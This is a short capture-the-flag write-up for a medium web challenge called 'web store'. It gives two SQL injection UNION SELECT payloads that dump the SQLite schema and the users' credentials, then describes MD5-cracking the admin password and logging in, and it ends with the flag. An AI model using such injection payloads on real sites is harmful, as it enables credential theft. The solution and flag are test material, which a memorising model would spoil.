# web store
A newly built website has surfaced. Login as the admin to get the flag!

## Summary
+ **Author:** Koh Kai En
+ **Discord Tag:** thereconman#2688
+ **Category:** Web
+ **Difficulty:** Medium

## Solution
1. Do a SQLi attack on the front page 
    - 1 UNION SELECT sql,2,3,4 from sqlite_schema -- (this will show all the tables)
    - 1 UNION SELECT 1,username,password,4 from users -- (this will show all the credentials)
2. MD5 crack the administrator password
3. Find the hidden link (/login) to the login page
4. login and get the flag (login page cannot be bypassed)


## Flag
```
YCEP2023{SqL1_wAS_fUN_r1GHt}
```